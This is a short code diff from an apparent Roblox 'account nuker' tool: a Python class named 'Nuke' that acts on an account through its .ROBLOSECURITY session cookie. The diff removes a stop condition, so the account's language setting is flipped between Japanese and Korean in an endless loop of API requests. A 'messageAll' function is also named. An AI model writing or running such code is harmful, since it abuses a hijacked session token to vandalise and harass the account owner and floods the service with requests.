@@ -58,11 +58,7 @@ class Nuke:
         time.sleep(0.1)
         cprint(i, "magenta",end="", flush=True)
   def changeLanguage(_):
-    try:
-      goOn
-    except:
-      time.sleep(1.5)
-    while goOn:
+    while True:
       requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(cookie)},headers=headers,data={"supportedLocaleCode": "ja_jp"})
       requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(cookie)},headers=headers,data={"supportedLocaleCode": "ko_kr"})
   def messageAll(message, _):
